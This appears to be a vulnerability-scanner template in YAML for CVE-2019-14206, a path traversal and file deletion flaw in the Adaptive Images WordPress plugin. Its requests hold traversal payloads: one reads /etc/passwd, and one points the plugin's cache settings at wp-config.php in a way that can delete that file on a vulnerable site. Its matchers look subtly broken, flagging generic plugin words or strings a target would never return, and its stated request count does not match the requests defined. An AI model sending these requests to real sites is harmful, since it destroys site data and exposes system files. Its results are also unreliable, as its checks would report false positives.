id: CVE-2019-14206

info:
  name: Adaptive Images for WordPress < 0.6.67 - Arbitrary File Deletion
  author: princechaddha
  severity: high
  description: |
    Adaptive Images plugin before 0.6.67 for WordPress is affected by an arbitrary file deletion 
    vulnerability. The vulnerability exists because the plugin uses user-supplied input to construct 
    file paths without proper sanitization in adaptive-images-script.php. An attacker can exploit 
    this by sending crafted requests with path traversal sequences to delete arbitrary files on the 
    target system.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
    cvss-score: 6.5
    cve-id: CVE-2019-14206
    cwe-id: CWE-22
  reference:
    - https://markgruffer.github.io/2019/07/19/adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.html
    - https://nvd.nist.gov/vuln/detail/CVE-2019-14206
    - https://wordpress.org/plugins/adaptive-images/
  metadata:
    verified: true
    max-request: 3
    shodan-query: "adaptive-images-script.php"
  tags: wordpress,adaptive-images,cve-2019-14206,file-deletion,lfi,wp-plugin

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "adaptive-images"
          - "cache_dir"
          - "resolution"
        part: body
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?resolution=16000&adaptive-images-settings[source_file]=/etc/passwd&adaptive-images-settings[request_uri]=../etc/passwd"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:"
          - "bin:"
          - "daemon:"
        part: body
        condition: or
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?resolution=16000&adaptive-images-settings[source_file]=../../../wp-content/uploads/test.jpg&adaptive-images-settings[cache_dir]=../../..&adaptive-images-settings[request_uri]=wp-config.php&adaptive-images-settings[watch_cache]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "VULNERABILITY"
          - "VULNERABLE"
          - "CVE-2019-14206"
          - "adaptive-images-settings"
          - "cache_dir"
          - "source_file"
        part: body
        condition: or
      - type: status
        status:
          - 200

    # Fallback: Check if plugin files exist
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/adaptive-images/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images.php"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Adaptive Images"
          - "Plugin Name"
          - "adaptive-images"
        condition: or
